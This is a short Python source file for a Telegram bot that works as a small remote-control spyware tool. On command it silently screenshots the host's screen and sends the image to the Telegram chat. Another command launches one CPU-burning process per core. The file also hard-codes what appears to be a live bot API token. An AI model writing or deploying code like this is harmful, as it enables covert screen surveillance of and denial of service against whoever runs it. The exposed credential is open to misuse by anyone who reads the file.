


import sys
import os
import logging
import multiprocessing
from utils.burn import burn_cpu
import pyscreenshot as ImageGrab
from aiogram import Bot, Dispatcher, executor, types



API_TOKEN = '885530793:AAGdNY6Ym2LR0xYi9emFTtQ1LMYxUoISBsg'
logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)



@dp.message_handler(commands=['burn_cpu'])
async def burn(message: types.message):
	process_count = 1
	while(process_count <= multiprocessing.cpu_count()):
		process_to_be_not_seen_again = multiprocessing.Process(target=burn_cpu)
		process_to_be_not_seen_again.start()
		process_count += 1
	await message.reply("Burning CPU...")



@dp.message_handler(commands=['sc'])
async def sc(message: types.Message):
	im = ImageGrab.grab()
	im.save('sc.png')
	with open('sc.png', 'rb') as photo:
		await message.reply_photo(photo, caption='fullsc')
	os.remove("sc.png")


if __name__ == '__main__':
	executor.start_polling(dp, skip_updates=True)
